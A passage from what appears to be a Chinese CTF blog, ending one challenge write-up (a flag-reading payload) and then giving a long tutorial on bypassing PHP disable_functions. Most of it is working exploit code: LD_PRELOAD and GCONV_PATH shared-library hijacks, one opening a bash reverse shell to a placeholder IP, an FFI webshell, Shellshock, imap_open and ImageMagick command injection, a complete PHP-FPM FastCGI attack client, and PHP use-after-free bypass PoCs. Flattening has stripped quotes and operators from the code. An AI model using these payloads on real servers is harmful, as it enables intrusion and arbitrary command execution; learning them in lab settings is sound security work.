clone_mt(prng)for _ in range(624): g.getrandbits(32) # 消耗前 624 个数字，让状态同步print(Next 20 predicted random numbers:)for _ in range(20): print(g.getrandbits(32)) 然后就是执行命令 key:3384741307,payload:__import__(os).system(mkdir /app/static cat /flag /app/static/flag.txt) 这样就行","tags":["CTF-wp"]},{"title":"Bypass disablefunction","path":"/2025/09/01/bypass-disablefunction/","content":"disable_function绕过靶场https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions 里面记录了部分的绕过 可以自己使用docker起环境复现 执行命令返回ret=127 这个是shell返回的一个标准执行码 127代表命令没有被找到 绕过方法LD_PRELOAD 环境变量LD_PRELOAD 是一个特殊的环境变量，用来告诉动态链接器在加载程序时，优先加载你指定的共享库（.so 文件）Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载。即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被加载，因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。一般情况下，ld-linux.so加载动态链接库的顺序为：LD_PRELOAD LD_LIBRARY_PATH /etc/ld.so.cache /lib /usr/lib 初级 有sendmail通过putenv()函数将LD_PRELOAD设置为指定恶意动态链接库(.so)文件路径，利用其加载优先级高劫持任意函数执行的内容，从而达到不调用 PHP 的各种命令执行函数仍可执行系统命令的目的。这时候需要一个不在disable_functions内的PHP函数，又能在调用时运行系统可执行程序。 攻击思路： 创建一个.so文件,linux的动态链接库文件使用putenv函数将LD_PRELOAD路径设置为我们自己创建的动态链接库文件利用某个函数去触发该动态链接库 这里使用mail()函数进行测试： 使用readelf -Ws /usr/sbin/sendmail 可以查看 sendmail 命令可能调用的库函数 strace -f可查看具体执行过程中调用的函数，这里拿 geteuid() 函数为例 我们这里使用getuid函数,目标是劫持该函数: #include stdlib.h#include stdio.h#include string.hvoid payload() system(whoami /var/tmp/flag.txt);int geteuid() if (getenv(LD_PRELOAD) == NULL) return 0; unsetenv(LD_PRELOAD); payload(); 编译成so文件 gcc -c -fPIC test.c -o testgcc -shared test -o test.so 再次新建一个shell.php文件写成 ?phpputenv(LD_PRELOAD=/var/www/test.so);mail(,,,,);? 把这个文件上传到有权限上传的目录当中 例题:[极客大挑战]RCE ME这题前置不说了最主要是落脚到disablefunction的绕过 因为这道题网站根目录没上传文件的权限 我们改到vartmp目录上传 但是我们必须要访问这个shell.php 这样我们的so文件才能够生效 于是异或取反写$_GET[_]($_GET[_]); 进行文件包含就好了 然后进antsword刷新 就可以看到我们的flag.txt ?code=$%fe%fe%fe%fe^%a1%b9%bb%aa[_]($%fe%fe%fe%fe^%a1%b9%bb%aa[__]);_=assert__=include(/var/tmp/shell.php) shell.php和test.c的文件内容 ?phpputenv(LD_PRELOAD=/var/tmp/test.so);mail(,,,,);? #include stdlib.h#include stdio.h#include string.hvoid payload() system(/readflag /var/tmp/flag.txt);int geteuid() if (getenv(LD_PRELOAD) == NULL) return 0; unsetenv(LD_PRELOAD); payload(); 进阶 无sendmail使用三个重要文件 项目地址 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD.git bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so传到目标有权限的目录中 那么这几个文件的原理 你看c源码就可以知道 #define _GNU_SOURCE#include stdlib.h#include stdio.h#include string.hextern char** environ;__attribute__ ((__constructor__)) void preload (void) // get command line options and arg const char* cmdline = getenv(EVIL_CMDLINE); // unset environment variable LD_PRELOAD. // unsetenv(LD_PRELOAD) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) if (strstr(environ[i], LD_PRELOAD)) environ[i][0] = \\0; // executive command system(cmdline); 最重要的是__attribute__((constructor)),他是GCC的一个C语言扩展修饰符。可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数 还是使用rce me这道例题 然后使用poc 因为我这道是因为网站根目录权限 只能上传到其他有权限的目录然后使用文件包含 ?code=$%fe%fe%fe%fe^%a1%b9%bb%aa[_]($%fe%fe%fe%fe^%a1%b9%bb%aa[__]);_=assert__=include(/var/tmp/bypass_disablefunc.php)cmd=/readflagoutpath=/tmp/tmpfilesopath=/var/tmp/bypass_disablefunc_x64.so 这样就可以成功拿到flag GCONV_PATH 环境变量利用条件 Linux 操作系统 putenv iconv 存在可写的目录, 需要上传 .so 文件 攻击思路： 可以使用antsword的插件 https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/ 攻击原理： linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的 gconv-modules 文件。gconv-modules 文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即 gconv-modules 文件提供了各个字符集的 .so 文件所在位置。php 的 iconv 函数的第一个参数是字符集的名字，这个参数会传递到 glibc 的 iconv_open 函数的参数中。iconv_open 函数依照GCONV_PATH找到 gconv-modules 文件。接着根据 gconv-modules 文件的指示找到参数对应的 .so 文件。然后调用 .so 文件中的 gconv() 和 gconv_init() 函数。这里就可以劫持函数执行任意命令了 #include stdio.h #include stdlib.h void gconv() void gconv_init() system(bash -c bash -i /dev/tcp/ip/23333 01); 编译成so文件 然后php文件是 ?php putenv(GCONV_PATH=/tmp); iconv(payload, UTF-8, whatever);? or ?php putenv(GCONV_PATH=/tmp/); include(php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so);? PHP7.4 FFI使用条件： 1.PHP 7.4 2.开启了 FFI 扩展且ffi.enable=true 概念： FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。 漏洞成因： 当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。 攻击代码 ?php$cmd=$_GET[cmd];$ffi = FFI::cdef(int system(const char *command););$ffi-system($cmd /tmp/sauy);echo file_get_contents(/tmp/sauy);@unlink(/tmp/SD);? 这样就可以绕过 来执行命令 Bash Shellshock老爷洞 了解下 (CVE-2014-6271)破壳漏洞 使用条件: 1.php 5.6.2 2.bash 4.3（破壳） 漏洞成因： Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“()”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断 ?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(.,data); putenv(PHP_LOL=() x; ; $cmd $tmp 21); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! //mail(a@127.0.0.1,,,,-bv); // -bv so we dont actuallysend any mail error_log(a,1); $output = @file_get_contents($tmp); @unlink($tmp); if($output != ) return $output; else return No output, or not vuln.; echo shellshock($_REQUEST[cmd]); ? 保存为php上传到目录 访问执行命令即可 imap_open使用条件： 1.有imap扩展 2.php.ini中开启imap.enable_insecure_rsh选项为On 漏洞成因： PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。 攻击： ?php error_reporting(0); if (!function_exists(imap_open)) die(no imap_open function!); $server = x -oProxyCommand=echot . base64_encode($_GET[cmd] ./tmp/cmd_result) . |base64t-d|sh; //$server = x -oProxyCommand=echo$IFS$() . base64_encode($_GET[cmd] ./tmp/cmd_result) . |base64$IFS$()-d|sh; imap_open( . $server . :143/imapINBOX, , ); // orvar_dump(nnError: .imap_last_error()); sleep(5); echo file_get_contents(/tmp/cmd_result); ? Pcntl组件使用条件： 1.目标机器安装并启用了php组件Pcntl 漏洞成因: 使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。 攻击思路： #pcntl_exec().php?php pcntl_exec(/bin/bash, array(/tmp/b4dboy.sh));?#/tmp/b4dboy.sh#!/bin/bashls -l / ImageMagick 漏洞绕过(CVE-2016–3714)使用条件: 1.目标主机安装了漏洞版本的imagemagick（ 3.3.0） 2.安装了php-imagick拓展并在php.ini中启用； 3.编写php通过new Imagick对象的方式来处理图片等格式文件； 4.PHP 5.4 ImageMagick介绍ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。 在 ImageMagick 的默认配置文件 etcImageMagickdelegates.xml 里可以看到所有的委托。这个文件定义了很多占位符，比如 %i 是输入的文件名，%l 是图片exif label信息。而在后面 command 的位置，%i 和 %l 等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号或闭合双引号，来执行任意命令。如果在phpinfo中看到有这个ImageMagick 就可以尝试一下这个 ?phpecho Disable Functions: . ini_get(disable_functions) . ;$command = PHP_SAPI == cli ? $argv[1] : $_GET[cmd];if ($command == ) $command = id;$exploit = EOFpush graphic-contextviewbox 0 0 640 480fill url(https://example.com/image.jpg|$command)pop graphic-contextEOF;file_put_contents(KKKK.mvg, $exploit);$thumb = new Imagick();$thumb-readImage(KKKK.mvg);$thumb-writeImage(KKKK.png);$thumb-clear();$thumb-destroy();unlink(KKKK.mvg);unlink(KKKK.png);? Apache Mod CGI使用条件: 1.Apache + PHP (apache 使用 apache_mod_php) 2.pache 开启了 cgi, rewrite 3.Web 目录给了 AllowOverride 权限 漏洞成因： 任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。 攻击: 在web目录下上传.htaccess Options +ExecCGIAddHandler cgi-script .ant 上传shell.ant #!/bin/shecho Content-type: text/htmlecho echoid 然后给shell.ant加上权限 直接访问即可得到命令执行结果 PHP-FPMFastCGI使用条件： phpinfo查看目标主机是否配置了 FPM/Fastcgi 概念： Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。 PHP-FPM(PHP FastCGI Process Manager)意：PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。 FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。 和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下： typedef struct /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; FCGI_Record; 头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。 了解了协议原理和内容，接下来就是使用CGI协议封装请求，通过Socket来直接与FPM通信。p神通过PHP-FPM的环境变量PHP_VALUE和PHP_ADMIN_VALUE设置php.ini配置项，通过配置项auto_prepend_file和auto_append_file结合php://input包含任意php代码并执行，并且修改了远程文件包含选项allow_url_include为on exp: import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(utf-8, strict)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, utf-8, strict) else: s = str(s) return sclass FastCGIClient: A Fast-CGI Client for Python # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid 8) 0xFF) \\ + bchr(requestid 0xFF) \\ + bchr((length 8) 0xFF) \\ + bchr(length 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b if nLen 128: record += bchr(nLen) else: record += bchr((nLen 24) | 0x80) \\ + bchr((nLen 16) 0xFF) \\ + bchr((nLen 8) 0xFF) \\ + bchr(nLen 0xFF) if vLen 128: record += bchr(vLen) else: record += bchr((vLen 24) | 0x80) \\ + bchr((vLen 16) 0xFF) \\ + bchr((vLen 8) 0xFF) \\ + bchr(vLen 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[version] = bord(stream[0]) header[type] = bord(stream[1]) header[requestId] = (bord(stream[2]) 8) + bord(stream[3]) header[contentLength] = (bord(stream[4]) 8) + bord(stream[5]) header[paddingLength] = bord(stream[6]) header[reserved] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[content] = b if contentLength in record.keys(): contentLength = int(record[contentLength]) record[content] += buffer.read(contentLength) if paddingLength in record.keys(): skiped = buffer.read(int(record[paddingLength])) return record def request(self, nameValuePairs=, post=): if not self.__connect(): print(connect failure! please check your fasctcgi-server !!) return requestId = random.randint(1, (1 16) - 1) self.requests[requestId] = dict() request = b beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b, requestId) self.sock.send(request) self.requests[requestId][state] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][response] = b return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[type] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[type] == FastCGIClient.__FCGI_TYPE_STDERR: if response[type] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[state] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[requestId]): self.requests[requestId][response] += response[content] if response[type] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][response] def __repr__(self): return fastcgi connect host: port:.format(self.host, self.port)if __name__ == __main__: parser = argparse.ArgumentParser(description=Php-fpm code execution vulnerability client.) parser.add_argument(host, help=Target host, such as 127.0.0.1) parser.add_argument(file, help=A php file absolute path, such as /usr/local/lib/php/System.php) parser.add_argument(-c, --code, help=What php code your want to execute, default=?php phpinfo(); exit; ?) parser.add_argument(-p, --port, help=FastCGI port, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = / uri = args.file content = args.code params = GATEWAY_INTERFACE: FastCGI/1.0, REQUEST_METHOD: POST, SCRIPT_FILENAME: documentRoot + uri.lstrip(/), SCRIPT_NAME: uri, QUERY_STRING: , REQUEST_URI: uri, DOCUMENT_ROOT: documentRoot, SERVER_SOFTWARE: php/fcgiclient, REMOTE_ADDR: 127.0.0.1, REMOTE_PORT: 9985, SERVER_ADDR: 127.0.0.1, SERVER_PORT: 80, SERVER_NAME: localhost, SERVER_PROTOCOL: HTTP/1.1, CONTENT_TYPE: application/text, CONTENT_LENGTH: %d % len(content), PHP_VALUE: auto_prepend_file = php://input, PHP_ADMIN_VALUE: allow_url_include = On response = client.request(params, content) print(force_text(response)) 脚本使用方法：python 111.py ip /var/www/html/index.php -p port -c ?php system(ls /); ? 也可以使用antsword插件 GC UAF利用条件 1.Linux 操作系统 2.PHP7.0 - all versions to date 3.PHP7.1 - all versions to date 4.PHP7.2 - all versions to date 5.PHP7.3 - all versions to date 攻击exp: ?php# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=72530## This exploit should work on all PHP 7.0-7.3 versions## Author: https://github.com/mm0r1pwn(uname -a);function pwn($cmd) global $abc, $helper; function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; function leak($addr, $p = 0, $s = 8) global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-a); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; function parse_elf($base) $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = leak($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return leak($addr + 8); $addr += 0x20; while($f_entry != 0); return false; class ryat var $ryat; var $chtg; function __destruct() $this-chtg = $this-ryat; $this-ryat = 1; class Helper public $a, $b, $c, $d; if(stristr(PHP_OS, WIN)) die(This PoC is for *nix systems only.); $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = str_repeat(A, 79); $poc = a:4:i:0;i:1;i:1;a:1:i:0;O:4:ryat:2:s:4:ryat;R:3;s:4:chtg;i:2;i:1;i:3;i:2;R:5;; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-b = function ($x) ; if(strlen($abc) == 79 || strlen($abc) == 0) die(UAF failed); # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) die(Couldnt determine binary base address); if(!($elf = parse_elf($base))) die(Couldnt parse ELF header); if(!($basic_funcs = get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); if(!($zif_system = get_system($basic_funcs))) die(Couldnt get zif_system address); # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i 0x110; $i += 8) write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-b)($cmd); exit(); 也可以使用antsword的插件 Json Serializer UAF利用条件： 利用条件 Linux 操作系统 PHP7.1 - all versions to date PHP7.2 7.2.19 (released: 30 May 2019) PHP7.3 7.3.6 (released: 30 May 2019) 攻击exp: ?php$cmd = id;$n_alloc = 10; # increase this value if you get segfaultsclass MySplFixedArray extends SplFixedArray public static $leak;class Z implements JsonSerializable public function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; public function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; public function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; # unable to leak ro segments public function leak1($addr) global $spl1; $this-write($this-abc, 8, $addr - 0x10); return strlen(get_class($spl1)); # the real deal public function leak2($addr, $p = 0, $s = 8) global $spl1, $fake_tbl_off; # fake reference zval $this-write($this-abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted $this-write($this-abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval $this-write($this-abc, $fake_tbl_off + 0x20, 6); # type (string) $leak = strlen($spl1::$leak); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; public function parse_elf($base) $e_type = $this-leak2($base, 0x10, 2); $e_phoff = $this-leak2($base, 0x20); $e_phentsize = $this-leak2($base, 0x36, 2); $e_phnum = $this-leak2($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = $this-leak2($header, 0, 4); $p_flags = $this-leak2($header, 4, 4); $p_vaddr = $this-leak2($header, 0x10); $p_memsz = $this-leak2($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; public function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = $this-leak2($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = $this-leak2($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = $this-leak2($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = $this-leak2($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; public function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = $this-leak2($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; public function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = $this-leak2($addr); $f_name = $this-leak2($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return $this-leak2($addr + 8); $addr += 0x20; while($f_entry != 0); return false; public function jsonSerialize() global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc; $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = new DateInterval(PT1S); $room = []; for($i = 0; $i $n_alloc; $i++) $room[] = new Z(); $_protector = $this-ptr2str(0, 78); $this-abc = $this-ptr2str(0, 79); $p = new DateInterval(PT1S); unset($y[0]); unset($p); $protector = .$_protector; $x = new DateInterval(PT1S); $x-d = 0x2000; $x-h = 0xdeadbeef; # $this-abc is now of size 0x2000 if($this-str2ptr($this-abc) != 0xdeadbeef) die(UAF failed.); $spl1 = new MySplFixedArray(); $spl2 = new MySplFixedArray(); # some leaks $class_entry = $this-str2ptr($this-abc, 0x120); $handlers = $this-str2ptr($this-abc, 0x128); $php_heap = $this-str2ptr($this-abc, 0x1a8); $abc_addr = $php_heap - 0x218; # create a fake class_entry $fake_obj = $abc_addr; $this-write($this-abc, 0, 2); # type $this-write($this-abc, 0x120, $abc_addr); # fake class_entry # copy some of class_entry definition for($i = 0; $i 16; $i++) $this-write($this-abc, 0x10 + $i * 8, $this-leak1($class_entry + 0x10 + $i * 8)); # fake static members table $fake_tbl_off = 0x70 * 4 - 16; $this-write($this-abc, 0x30, $abc_addr + $fake_tbl_off); $this-write($this-abc, 0x38, $abc_addr + $fake_tbl_off); # fake zval_reference $this-write($this-abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval $this-write($this-abc, $fake_tbl_off + 8, 10); # zval type (reference) # look for binary base $binary_leak = $this-leak2($handlers + 0x10); if(!($base = $this-get_binary_base($binary_leak))) die(Couldnt determine binary base address); # parse elf header if(!($elf = $this-parse_elf($base))) die(Couldnt parse ELF); # get basic_functions address if(!($basic_funcs = $this-get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); # find system entry if(!($zif_system = $this-get_system($basic_funcs))) die(Couldnt get zif_system address); # copy hashtable offsetGet bucket $fake_bkt_off = 0x70 * 5 - 16; $function_data = $this-str2ptr($this-abc, 0x50); for($i = 0; $i 4; $i++) $this-write($this-abc, $fake_bkt_off + $i * 8, $this-leak2($function_data + 0x40 * 4, $i * 8)); # create a fake bucket $fake_bkt_addr = $abc_addr + $fake_bkt_off; $this-write($this-abc, 0x50, $fake_bkt_addr); for($i = 0; $i 3; $i++) $this-write($this-abc, 0x58 + $i * 4, 1, 4); # copy bucket zval $function_zval = $this-str2ptr($this-abc, $fake_bkt_off); for($i = 0; $i 12; $i++) $this-write($this-abc, $fake_bkt_off + 0x70 + $i * 8, $this-leak2($function_zval, $i * 8)); # pwn $this-write($this-abc, $fake_bkt_off + 0x70 + 0x30, $zif_system); $this-write($this-abc, $fake_bkt_off, $fake_bkt_addr + 0x70); $spl1-offsetGet($cmd); exit(); $y = [new Z()];json_encode([$y]); 保存为php上传到vartmp 文件包含即可 Backtrace UAF使用条件： Linux 操作系统 PHP7.0 - all versions to date PHP7.1 - all versions to date PHP7.2 - all 